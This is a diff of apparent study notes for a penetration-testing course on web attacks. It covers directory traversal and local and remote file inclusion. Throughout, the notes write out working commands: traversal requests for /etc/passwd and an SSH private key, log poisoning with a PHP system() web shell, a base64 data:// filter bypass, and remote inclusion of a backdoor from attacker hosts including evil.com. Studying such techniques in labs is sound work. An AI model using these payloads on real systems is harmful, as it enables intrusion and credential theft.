@@ -341,8 +341,8 @@
       - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
       - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
       - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
-    - File inclusion vulnerabilities
-      - **Local file inclusion (LFI)** allow us to “include” a file in the application’s running code
+    - **File inclusion vulnerabilities**: allow us to “include” a file in the application’s running code.
+      - **Local file inclusion (LFI)** Includes files from the local server filesystem. E.g http://target.com/index.php?page=../../../../etc/passwd
         - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`: Log entry of Apache’s access.log. Response incude user agent info  
         - `<?php echo system($_GET['cmd']); ?>`: modify user agent header to include PHP snippet
         - `../../../../../../../../../var/log/apache2/access.log&cmd=ps`: execute the command. output to access.log
@@ -359,10 +359,12 @@
         - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
         - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`: bypass filter system command
         - data:// will not work in a default PHP installation. To exploit it, the "allow_url_include" setting needs to be enabled
-      - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB.
-        - PHP webshell locates in kali "/usr/share/webshells/php/"
+      - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB. E.g http://target.com/index.php?page=http://attacker.com/shell.txt
+        - Requires allow_url_include=On in PHP config  
+        - PHP webshell locates in kali "/usr/share/webshells/php/"  
         - remote file must access by target system. Use Python3 http.server to start a web server `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file
         - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
+        - shell.txt `<?php system($_GET['cmd']); ?>` then run `http://target.com/index.php?page=http://evil.com/shell.txt&cmd=id`
     - File upload vulnerabilities
       - 
     - Command injection
